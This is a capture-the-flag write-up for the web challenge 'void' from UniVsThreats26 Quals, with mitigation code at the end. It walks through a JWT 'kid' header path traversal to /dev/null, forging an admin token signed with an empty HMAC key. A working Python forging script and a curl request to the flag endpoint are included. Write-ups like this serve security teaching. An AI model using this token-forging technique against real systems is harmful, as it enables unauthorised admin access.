---
title: UniVsThreats26 Quals
description: top 126
date: 2026-02-21 00:00:00+0000
image: image.png
categories:
    - CTF
tags:
    - Path traversal 
    - Bypass by empty key  
weight: 25
---
 

## void — UniVsThreats26 Quals

**Category:** Web
**Flag:** `UVT{Y0u_F0Und_m3_I_w4s_l0s7_1n_th3_v01d_of_sp4c3_I_am_gr3tefull_and_1'll_w4tch_y0ur_m0v3s_f00000000000r3v3r}`

---

## Challenge Description

Web app "STELLAR GATEWAY" - USS Threads Command Center.
Objective: access `/flag` which requires **administrator** privileges.

---

## Recon

### Step 1 - Read HTML source of `/login`

```html
<!-- SGFoYWhhX25pY2VfdHJ5X2J1dF9JX2Rvbid0X2hpZGVfZmxhZ3NfaW5fc291cmNlX2NvZGU6KSkpKSkpKSkpKQ== -->
<!-- Test credentials: pilot_001 / S3cret_P1lot_Ag3nt -->
```

Decode the base64 comment: `Hahaha_nice_try_but_I_don't_hide_flags_in_source_code:))))))))))` — a fake hint.

Found **test credentials**: `pilot_001 / S3cret_P1lot_Ag3nt`.

### Step 2 - Analyze JWT after login

```
POST /login  ->  Set-Cookie: session=<JWT>
```

Decoded JWT:

```json
Header:  {"alg":"HS256","typ":"JWT","kid":"galactic-key.key"}
Payload: {"sub":"pilot_001","role":"crew","iat":...}
```

Key observation: the **`kid`** field in the header points to the file `galactic-key.key`.
The server reads this file as the HMAC secret key to verify the JWT.

### Step 3 - Test endpoints

| Endpoint    | Crew JWT | No cookie     |
|-------------|----------|---------------|
| /my-account | 200      | 302 -> /login |
| /bridge     | 200      | 302 -> /login |
| /admin      | 403      | 302 -> /login |
| /flag       | 403      | 302 -> /login |

---

## Vulnerability Analysis

### JWT kid Path Traversal (CWE-22)

The server uses the `kid` field to locate the HMAC key file:

```javascript
// Server logic (pseudo-code)
const kid = jwt.header.kid;
const key = fs.readFileSync(kid);        // NO path validation!
const payload = jwt.verify(token, key);
```

No path traversal validation, so any file on the filesystem can be specified.

**Exploit:** Use `/dev/null` — a file that always exists and is always empty (0 bytes):

```
kid: "/dev/null"  ->  key = ""  ->  HMAC with empty string
```

**Verification:** A JWT with `kid: /dev/null` signed with an empty key:
- Server returns **403** (authenticated) instead of **302** (invalid JWT) -> JWT is valid!

### Admin Authorization Mechanism

The server does **not** use the `role` field in the JWT for admin checks.
Instead, it looks up the user in the **database** based on `sub`:

```javascript
// Server logic (pseudo-code)
const payload = jwt.verify(token, key);
const user    = db.findUser(payload.sub);  // DB lookup by sub
if (user.role !== 'admin') return 403;     // role from DB, not JWT!
```

Therefore, forging `role: "admin"` in the JWT has no effect.
We need `sub` to be an **admin user that exists in the database**.

Tried various `sub` values (pilot_001, admin, captain, void...),
discovered: **`administrator`** is the actual admin user in the DB!

---

## Exploit

### Step 1 - Forge JWT

```python
import hmac, hashlib, base64, json

def b64url_encode(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

header  = {"alg": "HS256", "typ": "JWT", "kid": "/dev/null"}
payload = {"sub": "administrator", "role": "admin", "iat": 1772184460}

h  = b64url_encode(json.dumps(header,  separators=(',', ':')))
p  = b64url_encode(json.dumps(payload, separators=(',', ':')))

signing_input = h + "." + p

# Empty key because /dev/null returns empty bytes
sig = hmac.new(b"", signing_input.encode(), hashlib.sha256).digest()
s   = b64url_encode(sig)

forged_jwt = signing_input + "." + s
print(forged_jwt)
```

### Step 2 - Send request to get the flag

```bash
curl -b "session=<forged_jwt>" http://<target>/flag
```

---

## Flag

```
UVT{Y0u_F0Und_m3_I_w4s_l0s7_1n_th3_v01d_of_sp4c3_I_am_gr3tefull_and_1'll_w4tch_y0ur_m0v3s_f00000000000r3v3r}
```

---

## Root Cause & Mitigation

**Root cause:**
1. No `kid` field validation -> path traversal to `/dev/null`
2. Admin user `administrator` exists in the DB but server checks `sub`, not JWT `role`
3. Attacker can enumerate `sub` values to find the admin username

**Fix:**
```javascript
// 1. Whitelist kid values
const ALLOWED_KIDS = ['galactic-key.key'];
if (!ALLOWED_KIDS.includes(kid)) throw new Error('Invalid kid');

// 2. Use path.basename to prevent path traversal
const keyPath = path.join(KEYS_DIR, path.basename(kid));

// 3. Validate user exists before checking role
const user = await db.findUser(payload.sub);
if (!user) return res.redirect('/login');
```

---

## Attack Chain

```
Recon /login page
    |
    +-- Found credentials: pilot_001 / S3cret_P1lot_Ag3nt
    |
    +-- Login -> JWT: kid="galactic-key.key", role="crew"
           |
           +-- Discovered: kid is used to read key file from filesystem
           |
           +-- Path Traversal: kid="/dev/null" -> key = b""
                      |
                      +-- Forge JWT signed with empty HMAC key (valid JWT!)
                      |
                      +-- Enumerate sub: "administrator" = admin user in DB
                                 |
                                 +-- GET /flag -> 200 OK -> FLAG!
```

---

*Event: UniVsThreats26 Quals, 2026*
